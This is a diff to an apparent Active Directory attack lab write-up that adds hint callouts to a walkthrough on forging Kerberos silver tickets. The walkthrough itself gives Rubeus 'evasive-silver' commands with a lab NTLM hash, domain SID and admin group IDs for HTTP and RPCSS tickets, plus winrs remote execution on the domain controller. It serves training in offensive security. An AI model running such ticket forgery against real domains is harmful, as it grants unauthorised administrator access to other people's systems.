@@ -14,7 +14,14 @@ The lab begins with InviShell and PowerView.
 
 
 ## 2. Extract secrets from domain controller
-To create a silver ticket for accessing services on `domain controller` we need to extract the `secret` from the domain controller.
+
+> [!warning] HINTS
+> The account that protects a service ticket depends on the service identity and SPN configuration; not every Windows service necessarily runs under the machine account. 
+> 
+> We should establish that mapping rather than assume it.
+
+To create a silver ticket for accessing services on `domain controller` we need to extract the 
+`secret` from the domain controller.
 
 So we can extract the secrets connecting to `svcadmin` from our StudentVM.
 ```powershell 
@@ -60,6 +67,14 @@ Now that we have the `NTLM` secret we can cretae the silver ticket.
 
 
 # 3 - silver ticket for HTTP
+
+> [!warning] HINTS
+> A Silver Ticket is service-specific. 
+> 
+> We should distinguish the service principal named in the ticket from the endpoint and operation being tested, because a ticket for one SPN does not automatically authorize every service.
+
+
+
 To create a silver ticket for http we can use in our student VM shell (admin priv):
 ```powershell
 C:\AD\Tools\Rubeus.exe evasive-silver  /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:19d0dabe4bd080c448d8195179d5fe4c  /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
@@ -77,7 +92,15 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 
 
 ## 3.1 check if we can run commands on `dcorp-dc` using the ticket
+
+> [!warning] HINTS
+> If we see a working remote command, we should record the protocol, hostname, and resulting process identity. 
+> 
+> A ticket appearing in the cache is not by itself evidence of successful remote authorization.
+
+
 In the shell where we created the silver ticket we run:
+
 ```powershell
 winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
 
@@ -87,12 +110,20 @@ set username && set computername
 - ![[Pasted image 20261124110506.png]]
 
 # 4. get silver ticket for accessin WMI
+
+> [!warning] HINTS
+> WMI uses several Windows authentication and management components. 
+> 
+> We should treat the HOST/RPCSS pair and distinguish a successful WMI information query from arbitrary remote code execution.
+
+
 >[!Important] 
 >To haave access to WMI (a tcch used to manage and interrogate windows machines locally or remotely) we need to jhave access on `RPCSS` and `RPC Endopoint Mapper` and to `Winmgmt`
 >
 >So we need one ticket for `HOST` servoce and one ticket for `RPCSS` service
 
 In the same elevated shell we can run:
+
 ```powershell
 C:\AD\Tools\Rubeus.exe evasive-silver  /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:19d0dabe4bd080c448d8195179d5fe4c  /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 
